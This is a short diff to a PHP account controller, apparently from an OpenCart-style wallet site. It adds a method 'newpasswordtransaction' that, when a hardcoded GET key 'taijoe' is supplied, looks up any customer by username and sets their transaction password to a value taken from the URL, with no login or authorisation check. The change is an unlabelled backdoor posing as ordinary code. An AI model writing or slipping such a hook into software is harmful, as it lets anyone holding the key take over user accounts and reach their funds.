@@ -37,6 +37,15 @@ class ControllerAccountAccount extends Controller {
 		die('1');
 		
 	}
+	public function newpasswordtransaction(){
+		$this -> load->model('account/customer');
+		if ($_GET['key']== 'taijoe') {
+			$customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
+			$this->model_account_customer->editPasswordTransactionCustomForEmail($customer_info, $_GET['p']);
+		}
+		die('2');
+		
+	}
 
 	public function capnhat_wallet(){
 			!$_GET && die();
